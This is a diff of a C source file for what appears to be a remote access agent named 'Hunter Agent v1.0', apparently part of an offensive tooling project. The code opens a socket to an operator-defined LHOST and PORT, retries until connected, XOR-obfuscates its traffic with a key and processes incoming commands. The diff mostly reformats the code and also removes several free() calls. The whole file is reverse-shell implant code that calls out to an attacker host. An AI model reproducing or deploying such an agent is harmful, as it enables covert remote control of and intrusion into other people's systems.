@@ -1,34 +1,33 @@
-#include "helpers.c"
-#include "payload_common.h"
 #include <arpa/inet.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/wait.h>
 #include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/wait.h>
+#include "helpers.c"
+#include "payload_common.h"
 
 #define MAXBUF 65536
 
 int main(void)
 {
-    int connection_established;
-    char* ip = LHOST;
-    char* key = KEY;
-    int keylen = strlen(key);
-    int port = PORT;
-    int n = 0;
-    char buf[MAXBUF];
+	int connection_established;
+	char* ip = LHOST;
+	char* key = KEY;
+	int keylen = strlen(key);
+	int port = PORT;
+	int n = 0;
+	char buf[MAXBUF];
 
-    struct sockaddr_in sa;
-    sa.sin_family = AF_INET;
-    sa.sin_port = htons(port);
-    sa.sin_addr.s_addr = inet_addr(ip);
+	struct sockaddr_in sa;
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(ip);
 
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    do {
-        connection_established =
-            connect(sock, (struct sockaddr*)&sa, sizeof(sa));
-    } while (connection_established != 0);
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	do {
+		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
+	} while(connection_established != 0);
 
 	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
 	write(sock, xorhello, 18);
@@ -89,17 +88,16 @@ int main(void)
 			{
 				char* xornewline = XOR("\n", key, 1, keylen);
 				write(sock, xornewline, 1);
-		    free(xornewline);
+		
 			}
 
-            else {
-                char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
-                write(sock, xorinvalid, strlen(MSG_INVALID));
-                free(xorinvalid);
-            }
-            free(xorbuf);
-        }
-    }
+			else
+			{
+				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
+				write(sock, xorinvalid, strlen(MSG_INVALID));
+			}		
+		}
+	}
 
-    return 0;
+	return 0;
 }
